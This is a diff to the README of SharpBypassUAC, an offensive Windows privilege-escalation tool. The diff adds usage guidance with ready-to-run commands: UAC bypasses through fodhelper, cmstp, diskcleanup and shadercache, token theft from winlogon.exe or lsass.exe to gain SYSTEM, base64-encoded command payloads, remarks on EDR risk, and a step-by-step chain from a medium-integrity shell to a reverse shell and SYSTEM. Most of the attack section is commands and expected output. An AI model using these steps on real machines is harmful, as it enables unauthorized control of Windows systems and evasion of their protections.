@@ -10,7 +10,10 @@ No external dependencies. Builds with standalone `csc.exe` (no Visual Studio or 
 
 - [Background](#background)
 - [Build](#build)
-- [Quick Reference](#quick-reference)
+- [Usage](#usage)
+  - [UAC Bypass (`-b`)](#uac-bypass--b--medium--high-integrity)
+  - [Token Impersonation (`-t`)](#token-impersonation--t--high--system-or-other-identity)
+  - [Chaining: Medium → High → SYSTEM](#chaining-medium--high--system)
 - [Techniques](#techniques)
   - [Registry Hijack Bypasses](#1-registry-hijack-bypasses)
     - [fodhelper](#fodhelper)
@@ -89,7 +92,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:an
 
 ---
 
-## Quick Reference
+## Usage
 
 ### Prepare Command
 
@@ -105,7 +108,11 @@ echo -n "cmd.exe /c whoami > C:\out.txt" | base64
 [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("cmd.exe /c whoami > C:\out.txt"))
 ```
 
-### UAC Bypass
+### UAC Bypass (`-b`) — Medium → High Integrity
+
+Use when you have a shell as a local administrator but at **medium integrity** (the default after login). UAC bypass tricks an auto-elevating Windows binary into executing your command with **high integrity**, skipping the consent prompt entirely.
+
+**Preconditions:** Current user is in local Administrators group, UAC is not set to "Always Notify".
 
 ```
 SharpBypassUAC.exe -b <method> -e <base64command>
@@ -122,24 +129,63 @@ SharpBypassUAC.exe -b <method> -e <base64command>
 | `shadercache` | File system + DLL hijack | Junction + symlink → oci.dll | x64, Intel GPU |
 | `cmstp` | COM elevation | CMSTPLUA COM object | Win7+ |
 
-### Token Impersonation
+**Examples:**
+
+```bash
+# Registry hijack — fodhelper (simplest, Win10+)
+SharpBypassUAC.exe -b fodhelper -e Y21kLmV4ZSAvYyBwb3dlcnNoZWxsIC1lbmMgLi4u
+
+# COM elevation — no registry artifact, broadest compatibility (Win7–Win11)
+SharpBypassUAC.exe -b cmstp -e Y21kLmV4ZSAvYyB3aG9hbWk=
+
+# Environment variable hijack — command must end with "&& REM"
+SharpBypassUAC.exe -b diskcleanup -e Y21kLmV4ZSAvYyBjYWxjLmV4ZSAmJiBSRU0=
+
+# File system + DLL hijack — x64 only, requires Intel GPU driver
+SharpBypassUAC.exe -b shadercache -e Y21kLmV4ZSAvYyB3aG9hbWk=
+```
+
+### Token Impersonation (`-t`) — High → SYSTEM (or other identity)
+
+Use when you **already have high integrity** (local admin, elevated) and need to escalate to `NT AUTHORITY\SYSTEM` or impersonate another user's identity. This duplicates the security token from a running process and spawns a new process under that token.
+
+**Preconditions:** Already running as local admin with high integrity (or `SeDebugPrivilege` enabled).
 
 ```
 SharpBypassUAC.exe -t <pid> -e <base64command>
 ```
 
-### Examples
+**Examples:**
 
 ```bash
-# Fodhelper UAC bypass
-SharpBypassUAC.exe -b fodhelper -e Y21kLmV4ZSAvYyBwb3dlcnNoZWxsIC1lbmMgLi4u
-
-# CMSTPLUA COM elevation (no registry artifact)
-SharpBypassUAC.exe -b cmstp -e Y21kLmV4ZSAvYyB3aG9hbWk=
-
-# Token impersonation (steal SYSTEM token from winlogon.exe)
+# Step 1: Find the PID of a SYSTEM process
 tasklist /FI "IMAGENAME eq winlogon.exe"
+#   winlogon.exe    624    Console    1    6,144 K
+
+# Step 2: Steal its token and spawn a SYSTEM shell
 SharpBypassUAC.exe -t 624 -e Y21kLmV4ZSAvYyB3aG9hbWk=
+
+# Or target lsass.exe for SYSTEM (higher EDR risk)
+tasklist /FI "IMAGENAME eq lsass.exe"
+SharpBypassUAC.exe -t 812 -e Y21kLmV4ZSAvYyB3aG9hbWk=
+```
+
+### Chaining: Medium → High → SYSTEM
+
+In a typical engagement, both modes are used sequentially:
+
+```bash
+# 1. Initial access: you have a medium-integrity shell as a local admin
+whoami /groups | findstr "Medium"
+#   Mandatory Label\Medium Mandatory Level
+
+# 2. UAC bypass: escalate to high integrity
+SharpBypassUAC.exe -b fodhelper -e <base64_reverse_shell>
+#   → New shell at High integrity
+
+# 3. Token impersonation: escalate to SYSTEM
+SharpBypassUAC.exe -t 624 -e <base64_payload>
+#   → Process running as NT AUTHORITY\SYSTEM
 ```
 
 ---
